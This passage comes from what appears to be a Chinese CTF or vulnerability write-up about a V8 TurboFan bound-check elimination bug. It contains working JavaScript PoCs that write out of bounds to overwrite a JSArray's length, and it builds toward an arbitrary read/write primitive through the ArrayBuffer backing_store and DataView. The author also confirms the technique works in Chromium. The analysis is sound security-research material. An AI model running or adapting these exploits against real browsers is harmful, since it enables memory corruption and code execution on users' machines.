<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 错误：arr前没有let、var或者const</span></span><br><span class="line">    arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="comment">// 错误：t 前没有let</span></span><br><span class="line">    t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：经过gdb动态调试可知，若数组前没有修饰词，则<code>CheckBounds</code>的上一个结点<code>LoadField</code>结点将不会被<code>LoadEliminationPhase</code>优化，这样使得数组<code>length</code>结点的范围最大值为134217726，最后导致无法成功优化<code>CheckBounds</code>结点：</p>
<p><img src="/2021/01/v8-turboFan/poc3.png" alt="img"></p>
<p>同时，若变量<code>t</code>前没有修饰词，则越界的<code>add</code>操作将被<code>check</code>出，进而设置值为<code>inf/NaN</code>，之后的减法就无法计算出我们所期望的Range值：</p>
<p><img src="/2021/01/v8-turboFan/poc3_1.png" alt="img"></p>
<p><strong>解决方法</strong>：添加修饰词。</p>
<blockquote>
<p>因为没有修饰词 let / var 的变量都是全局变量，而 Load Elimination 的优化对作用域有一定的要求，因此全局变量的 LoadField 结点将不会被优化。</p>
</blockquote>
</li>
<li>
<p>POC4：使用<strong>整数数组</strong></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：执行<code>console.log</code>时崩溃：</p>
<p><img src="/2021/01/v8-turboFan/poc4.png" alt="img"></p>
<p><strong>解决方法</strong>：更改数组类型。经过一番测试，发现貌似只能改成<strong>浮点数数组</strong>，改成其他类型的输出都会<strong>崩溃</strong>。</p>
</li>
<li>
<p>小结：构造POC需要重复多次 <strong>修改代码 =&gt; 观察输出 =&gt; 从turbolizer中查看结点图 =&gt; 分析错误原因</strong> 这个过程，有时还需要给源码打patch和上gdb调试，需要耐心。</p>
</li>
</ul>
</li>
<li>
<p>构造POC时，只需要关注两个重点：</p>
<ol>
<li>
<p>能否成功执行<code>DuplicateAdditionReducer</code>优化</p>
</li>
<li>
<p>能否成功优化<code>CheckBounds</code>结点。</p>
</li>
</ol>
<p>如果这两个条件都满足，那基本上构建出的POC可以OOB了。</p>
</li>
</ul>
<h5 id="2-越界读取">2) 越界读取</h5>
<p>POC有了，那我们试着看一下越界读取到的内存位置，</p>
<p>不出以外的话应该是最后一个元素<code>5.5</code>的下一个8位数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>) + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(arr[t]);</span><br><span class="line">    <span class="comment">// 将arr数组详细信息输出</span></span><br><span class="line">    %DebugPrint(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 下断点，使v8在gdb中暂停</span></span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>启动GDB，可以看到 d8 自动暂停执行：</p>
<p><img src="/2021/01/v8-turboFan/gdbtrap.png" alt="img"></p>
<p>之后我们可以找到DebugPrint出的数组内存地址：</p>
<p><img src="/2021/01/v8-turboFan/debugprint1.png" alt="img"></p>
<p>每个Object内部都有一个map，该map用于描述对应结构的相关属性。其中包括了当前Object的实例大小，以及一些供GC使用的信息。通过上面的输出，我们可以得到，当前JSArray的实例大小只有32字节。</p>
<blockquote>
<p>map的具体信息请查阅源码 src/objects/map.h 中的注释。</p>
</blockquote>
<p>因此，数组中的其他元素肯定存放于另一个数组，而这个数组的类型为<code>FixedDoubleArray</code>，其地址存放于JSArray中。</p>
<blockquote>
<p>需要注意的是：v8 中的指针值大多被打上了tag，以便于区分某个值是pointer还是smi。</p>
<p>因此在gdb使用某个地址时，最低位需要手动置0。</p>
</blockquote>
<p>以下是某个 JSArray 的内存布局：</p>
<p><img src="/2021/01/v8-turboFan/debugprint2.png" alt="img"></p>
<p>注意到 JSArray中，第四个8字节数据（即上图中的<code>0x0000000500000000</code>）存放的是当前数组的length（5），即便数组元素并没有存放在当前这块内存上。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/js-array.h</span></span><br><span class="line"><span class="comment">// static const int v8::internal::JSObject::kHeaderSize = 24</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> int kLengthOffset = JSObject::kHeaderSize;</span><br></pre></td></tr></table></figure>
<p>回到刚刚的话题，数组的值被存放在<code>FixedDoubleArray</code>中，因此我们输出一下内存布局看看：</p>
<p><img src="/2021/01/v8-turboFan/debugprint3.png" alt="img"></p>
<p>可以看到，它越界读取到的数据与先前猜测的一致，即最后一个元素的下一个8字节数据。</p>
<p>同时我们还可以从 gdb 的输出中注意到，一个 JSArray的length 即在 JSArray 中保存，又在 FixedDoubleArray 中存放着，这个也可以在源码中直接定位到操作：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/js-array-inl.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JSArray::SetContent</span><span class="params">(Handle&lt;JSArray&gt; <span class="built_in">array</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Handle&lt;FixedArrayBase&gt; storage)</span> </span>&#123;</span><br><span class="line">  EnsureCanContainElements(<span class="built_in">array</span>, storage, storage-&gt;length(),</span><br><span class="line">                           ALLOW_COPIED_DOUBLE_ELEMENTS);</span><br><span class="line"></span><br><span class="line">  DCHECK(</span><br><span class="line">      (storage-&gt;<span class="built_in">map</span>() == <span class="built_in">array</span>-&gt;GetReadOnlyRoots().fixed_double_array_map() &amp;&amp;</span><br><span class="line">       IsDoubleElementsKind(<span class="built_in">array</span>-&gt;GetElementsKind())) ||</span><br><span class="line">      ((storage-&gt;<span class="built_in">map</span>() != <span class="built_in">array</span>-&gt;GetReadOnlyRoots().fixed_double_array_map()) &amp;&amp;</span><br><span class="line">       (IsObjectElementsKind(<span class="built_in">array</span>-&gt;GetElementsKind()) ||</span><br><span class="line">        (IsSmiElementsKind(<span class="built_in">array</span>-&gt;GetElementsKind()) &amp;&amp;</span><br><span class="line">         Handle&lt;FixedArray&gt;::cast(storage)-&gt;ContainsOnlySmisOrHoles()))));</span><br><span class="line">  <span class="comment">// length既保存在 JSArray 中，也保存在 FixedArrayBase里</span></span><br><span class="line">  <span class="built_in">array</span>-&gt;set_elements(*storage);</span><br><span class="line">  <span class="built_in">array</span>-&gt;set_length(Smi::FromInt(storage-&gt;length()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但实际上， FixedDoubleArray 中的 length 只用于提供有关固定数组分配的信息，而越界检查只会检查 JSArray 的length，这意味着我们<strong>必须修改 JSArray 的 length 才可以进行任意地址读写</strong>。</p>
<blockquote>
<p>以下是检测数组访问是否越界的代码：</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/ic/ic.cc</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsOutOfBoundsAccess</span><span class="params">(Handle&lt;Object&gt; receiver, <span class="keyword">uint32_t</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> length = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (receiver-&gt;IsJSArray()) &#123;</span><br><span class="line">    <span class="comment">// 获取 JSArray 的 length</span></span><br><span class="line">    JSArray::cast(*receiver)-&gt;length()-&gt;ToArrayLength(&amp;length);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (receiver-&gt;IsString()) &#123;</span><br><span class="line">    length = String::cast(*receiver)-&gt;length();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (receiver-&gt;IsJSObject()) &#123;</span><br><span class="line">    length = JSObject::cast(*receiver)-&gt;elements()-&gt;length();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 判断是否越界</span></span><br><span class="line">  <span class="keyword">return</span> index &gt;= length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">KeyedAccessLoadMode <span class="title">GetLoadMode</span><span class="params">(Isolate* isolate, Handle&lt;Object&gt; receiver,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">uint32_t</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 一开始就判断越界</span></span><br><span class="line">  <span class="keyword">if</span> (IsOutOfBoundsAccess(receiver, index)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> STANDARD_LOAD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数调用栈帧：</span></span><br><span class="line"><span class="comment">    #0  v8::internal::(anonymous namespace)::IsOutOfBoundsAccess</span></span><br><span class="line"><span class="comment">    #1  v8::internal::(anonymous namespace)::GetLoadMode</span></span><br><span class="line"><span class="comment">    #2  v8::internal::KeyedLoadIC::Load</span></span><br><span class="line"><span class="comment">    #3  v8::internal::__RT_impl_Runtime_KeyedLoadIC_Miss</span></span><br><span class="line"><span class="comment">    #4  v8::internal::Runtime_KeyedLoadIC_Miss</span></span><br><span class="line"><span class="comment">    #5  Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit</span></span><br><span class="line"><span class="comment">    ....</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>为了验证上述内容的正确性，笔者手动用gdb修改了 JSArray 的 length，发现在 release 版本的v8下<strong>可以越界读取</strong>。但在 debug 版本下，会触发<code>FixedArray</code>中的<code>DCHECK</code>检查导致崩溃：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/fixed-array-inl.h</span></span><br><span class="line">DCHECK(index &gt;= <span class="number">0</span> &amp;&amp; index &lt; <span class="keyword">this</span>-&gt;length());</span><br></pre></td></tr></table></figure>
<p>因此在编译 debug 版本的 v8 时，需要手动注释掉<code>src/objects/fixed-array-inl.h</code> 中越界检查的DCHECK</p>
<blockquote>
<p>请勿直接编译 release 版本的v8来关闭DCHECK，这会大大提高调试难度。</p>
</blockquote>
<h4 id="b-构造任意地址读写">b. 构造任意地址读写</h4>
<h5 id="1-JSArray-修改-length">1) JSArray 修改 length</h5>
<ul>
<li>
<p>我们将 FixedArray 的内存布局输出，可以发现 JSArray 和 FixedArray 的数据是<strong>紧紧相邻</strong>的，且 FixedArray 位于低地址处，这为我们修改 JSArray 的 length 提供了一个非常好的条件：</p>
<p><img src="/2021/01/v8-turboFan/debugprint4.png" alt="img"></p>
</li>
<li>
<p>现在我们可以试着越界修改一下 JSArray 的 length。需要注意我们必须越界四格才能修改到length，因此需要稍微修改一下POC越界的范围：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>]; <span class="comment">// length =&gt; Range(7, 7)</span></span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    <span class="comment">// 此时 t =&gt; 解释/编译 Range(9007199254740989, 9007199254740992)</span></span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(9007199254740991, 9007199254740992)</span></span><br><span class="line"><span class="comment">        编译：Range(9007199254740991, 9007199254740994)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(1, 2)</span></span><br><span class="line"><span class="comment">        编译：Range(1, 4)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(2, 4)</span></span><br><span class="line"><span class="comment">        编译：Range(2, 8)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(4, 6)</span></span><br><span class="line"><span class="comment">        编译：Range(4, 10)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">console</span>.log(arr[t]);</span><br><span class="line">    %DebugPrint(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>最后输出了<code>1.4853970537e-313</code>，用gdb转换成int类型，刚好为<code>7</code>，这就意味着我们现在可以修改 JSArray 的 length 了。</p>
<p>试一试：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oob_arr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 将 smi(1024) 写入至 JSArray 的 length处</span></span><br><span class="line">    oob_arr[t] = <span class="number">2.1729236899484389e-311</span>; <span class="comment">// 1024.f2smi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 尝试优化</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    opt_me(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 试着越界读取一下</span></span><br><span class="line"><span class="built_in">console</span>.log(oob_arr.length);</span><br><span class="line"><span class="built_in">console</span>.log(oob_arr[<span class="number">100</span>]);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>可以发现，<strong>越界读写成功</strong>！</p>
<p><img src="/2021/01/v8-turboFan/debugprint5.png" alt="img"></p>
<p>在附件chromium中试试发现也是可以正常工作的：</p>
<p><img src="/2021/01/v8-turboFan/chromium_output1.png" alt="img"></p>
<p>但我们发现 v8 和 chromium 输出的值不一样，所以调试 d8 编写 JS 后还需要到 chromium 这边验证一下。</p>
<blockquote>
<p>这里有个注意点，在被turboFan优化过的函数中读写数组，其越界判断不会通过我们所熟知的<code>Runtime_KeyedLoadIC_Miss</code>函数，因此越界操作最好在被优化的函数外部执行。</p>
</blockquote>
</li>
<li>
<p>现在我们已经成功让 JSArray 实现大范围<strong>向后</strong>越界读取，但这明显不够，因为 JSArray 只能<strong>向后</strong>越界读写 <code>0x40000000</code>字节，有范围限制。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/fixed-array.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> V8_HOST_ARCH_32_BIT</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxSize = <span class="number">512</span> * MB;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxSize = <span class="number">1024</span> * MB;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// V8_HOST_ARCH_32_BIT</span></span></span><br></pre></td></tr></table></figure>
<p>看样子我们可以再次声明一个 JSArray ，然后越界修改其 elements 地址以达到任意地址读写的目的？实际上是不行的，因为每一个 element 都有其对应的 map 指针，如果我们要通过修改 elements 地址来进行任意读的话，我们还必须在目标地址手动伪造一个 fake map，但通常我们是没有办法来伪造的。</p>
<p>因此接下来我们将引入漏洞利用中比较常用的类型：<strong>ArrayBuffer</strong>。</p>
</li>
</ul>
<h5 id="2-ArrayBuffer">2) ArrayBuffer</h5>
<ul>
<li>
<p><code>ArrayBuffer</code>是漏洞利用中比较常见的一个对象，这个对象用于表示通用的、固定长度的原始二进制数据缓冲区。通常我们不能直接操作<code>ArrayBuffer</code>的内容，而是要通过类型数组对象（JSTypedArray）或者<code>DataView</code>对象来操作，它们会将缓冲区中的数据表示为特定的格式，并且通过这些格式来读写缓冲区的内容。<br>
<img src="/2021/01/v8-turboFan/console_print1.png" alt="img"></p>
<p>而 ArrayBuffer中的缓冲区内存，就是 v8 中 JSArrayBuffer 对象中的 <strong>backing_store</strong> 。</p>
</li>
<li>
<p>需要注意的是，ArrayBuffer 自身也有 element。这个 element 和 backing_store <strong>不是同一个东西</strong>：element 是一个 JSObject，而 backing_store 只是单单一块堆内存。 因此，单单修改 element 或 backing_store 里的数据都不会影响到另一个位置的数据。</p>
<p>以下是一个简单的 JS 测试代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x400</span>);</span><br><span class="line">int = <span class="keyword">new</span> <span class="built_in">Int32Array</span>(buffer);</span><br><span class="line">int[<span class="number">2</span>] = <span class="number">1024</span>;</span><br><span class="line">buffer[<span class="number">1</span>] = <span class="number">0x200</span>;</span><br><span class="line">%DebugPrint(buffer);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>浏览器中输出的结果：</p>
<p><img src="/2021/01/v8-turboFan/console_print2.png" alt="img"></p>
<p>gdb中输出的地址信息：</p>
<p><img src="/2021/01/v8-turboFan/debugprint11.png" alt="img"></p>
</li>
<li>
<p>我们可以很容易的推测出，那些 <strong>JSTypedArray 读写的都是 ArrayBuffer 的 backing_store</strong>，因此如果我们可以任意修改 ArrayBuffer 的 backing_store，那么就可以通过 JSTypedArray 进行任意地址读写。</p>
<blockquote>
<p>JSTypedArray 包括但不限于 DataView、Int32Array、Int64Array、Float32Array、Float64Array 等等。</p>
</blockquote>
<p>笔者将在下面使用<code>DataView</code>对象来对 ArrayBuffer 的 backing_store 进行读写。为了证明 DataView 修改的确实是 ArrayBuffer 中 backing_store 指向的那块堆内存，笔者找到其对应的代码：</p>
<blockquote>
<p>注：以下代码来自<code>v8/src/builtins/data-view.tq</code>，代码语言为V8 <code>Torque</code>。该语言的语法类似于<code>TypeScript</code>，其设计目的在于更方便的表示高级的、语义丰富的V8实现。Torque编译器使用CodeStubAssembler将这些片断转换为高效的汇编代码。</p>
<p>更多关于该语言的信息请查阅 <a href="https://v8.dev/docs/torque" target="_blank" rel="noopener">V8 Torque user manual</a>。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/builtins/data-view.tq</span></span><br><span class="line">javascript builtin DataViewPrototypeSetFloat64(</span><br><span class="line">    context: Context, <span class="attr">receiver</span>: <span class="built_in">Object</span>, ...arguments): <span class="built_in">Object</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> offset: <span class="built_in">Object</span> = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> ?</span><br><span class="line">          <span class="built_in">arguments</span>[<span class="number">0</span>] :</span><br><span class="line">          Undefined;</span><br><span class="line">      <span class="keyword">let</span> value : <span class="built_in">Object</span> = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span> ?</span><br><span class="line">          <span class="built_in">arguments</span>[<span class="number">1</span>] :</span><br><span class="line">          Undefined;</span><br><span class="line">      <span class="keyword">let</span> is_little_endian : <span class="built_in">Object</span> = <span class="built_in">arguments</span>.length &gt; <span class="number">2</span> ?</span><br><span class="line">          <span class="built_in">arguments</span>[<span class="number">2</span>] :</span><br><span class="line">          Undefined;</span><br><span class="line">      <span class="comment">// 在越界检查完成后，继续调用 DataViewSet函数。</span></span><br><span class="line">      <span class="keyword">return</span> DataViewSet(context, receiver, offset, value,</span><br><span class="line">                         is_little_endian, FLOAT64_ELEMENTS);</span><br><span class="line">    &#125;</span><br><span class="line">macro DataViewSet(context: Context,</span><br><span class="line">                    receiver: <span class="built_in">Object</span>,</span><br><span class="line">                    offset: <span class="built_in">Object</span>,</span><br><span class="line">                    value: <span class="built_in">Object</span>,</span><br><span class="line">                    requested_little_endian: <span class="built_in">Object</span>,</span><br><span class="line">                    kind: constexpr ElementsKind): <span class="built_in">Object</span> &#123;</span><br><span class="line">    <span class="comment">// 获取当前 DataView 类型</span></span><br><span class="line">    <span class="keyword">let</span> data_view: JSDataView = ValidateDataView(</span><br><span class="line">        context, receiver, MakeDataViewSetterNameString(kind));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">let</span> littleEndian: bool = ToBoolean(requested_little_endian);</span><br><span class="line">    <span class="comment">// 获取当前 DataView 中的 Buffer，即对应的 ArrayBuffer</span></span><br><span class="line">    <span class="keyword">let</span> buffer: JSArrayBuffer = data_view.buffer;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> double_value: float64 = ChangeNumberToFloat64(num_value);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> constexpr (kind == UINT8_ELEMENTS || kind == INT8_ELEMENTS) &#123;</span><br><span class="line">         <span class="comment">// ...</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> constexpr (kind == FLOAT64_ELEMENTS) &#123;</span><br><span class="line">      <span class="comment">// 将一个64位值分解成两个32位值并写入Buffer.</span></span><br><span class="line">        <span class="keyword">let</span> low_word: uint32 = Float64ExtractLowWord32(double_value);</span><br><span class="line">        <span class="keyword">let</span> high_word: uint32 = Float64ExtractHighWord32(double_value);</span><br><span class="line">        StoreDataView64(buffer, bufferIndex, low_word, high_word,</span><br><span class="line">                        littleEndian);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line">macro StoreDataView64(buffer: JSArrayBuffer, <span class="attr">offset</span>: intptr,</span><br><span class="line">                        low_word: uint32, <span class="attr">high_word</span>: uint32,</span><br><span class="line">                        requested_little_endian: bool) &#123;</span><br><span class="line">    <span class="comment">// 获取写入的内存地址，这里取的是 ArrayBuffer 中的 backing_store </span></span><br><span class="line">    <span class="comment">// 可以看到这个结果与我们的预计是一致的。</span></span><br><span class="line">    <span class="keyword">let</span> data_pointer: RawPtr = buffer.backing_store;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (requested_little_endian) &#123;</span><br><span class="line">      <span class="comment">// 将值写入 backing_store。</span></span><br><span class="line">      StoreWord8(data_pointer, offset, b0);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">1</span>, b1);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">2</span>, b2);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">3</span>, b3);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">4</span>, b4);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">5</span>, b5);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">6</span>, b6);</span><br><span class="line">      StoreWord8(data_pointer, offset + <span class="number">7</span>, b7);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>因此，现在我们可以试着构建任意地址读写原语</p>
</li>
</ul>
<h5 id="3-任意地址读写原语">3) 任意地址读写原语</h5>
<ul>
<li>
<p>根据上面的分析，我们可以梳理一条这样的过程来构造任意地址读写原语：</p>
<ul>
<li>通过 OOB 修改其自身 JSArray 的 length，从而达到大范围越界读写。</li>
<li>试着<strong>将 ArrayBuffer 分配到与 OOB 的 JSArray 相同的内存段上</strong>，这样就可以通过 OOB 来修改 ArrayBuffer 的 backing_store。</li>
<li>将 ArrayBuffer 与 DataView 对象关联，这样就可以在 JSArray 越界修改 ArrayBuffer 的 backing_store 后，通过DataView 对象读写目标内存。</li>
</ul>
</li>
<li>
<p>需要注意的是，在确定 FixedDoubleArray 与 backing_store 之前的相对偏移时，最好不要使用<strong>硬编码</strong>。因为如果需要在当前内存段上再新建立一个对象时，原先的相对偏移很有可能会失效；而且不使用硬编码也可以<strong>更好的将 exp 从 v8 移植到 chromium上</strong>。</p>
<p>但不使用硬编码时，使用 for循环结果语句 来<strong>循环越界读取数组</strong>将会触发一个<code>CSA_ASSERT</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/code-stub-assembler.cc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// in TNode&lt;Float64T&gt; CodeStubAssembler::LoadFixedDoubleArrayElement</span></span><br><span class="line">CSA_ASSERT(<span class="keyword">this</span>, IsOffsetInBounds(</span><br><span class="line">    offset, LoadAndUntagFixedArrayBaseLength(object),</span><br><span class="line">    FixedDoubleArray::kHeaderSize, HOLEY_DOUBLE_ELEMENTS));</span><br></pre></td></tr></table></figure>
<p>由于<code>CSA_ASSERT</code>只会在Debug版本下的 v8 生效，因此我们同样可以注释掉该语句再重新编译，不影响 chromium 中 exp 的编写。</p>
</li>
<li>
<p>综上所述，最后构造出的<strong>任意地址读写原语</strong>如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">msg</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(msg);</span><br><span class="line">    <span class="comment">// var elem = document.getElementById("#log");</span></span><br><span class="line">    <span class="comment">// elem.innerText += '[+] ' + msg + '\n';</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transformBuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> bigIntArray = <span class="keyword">new</span> BigInt64Array(transformBuffer);</span><br><span class="line"><span class="keyword">var</span> floatArray = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(transformBuffer);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64ToFloat64</span>(<span class="params">int</span>)</span></span><br><span class="line"><span 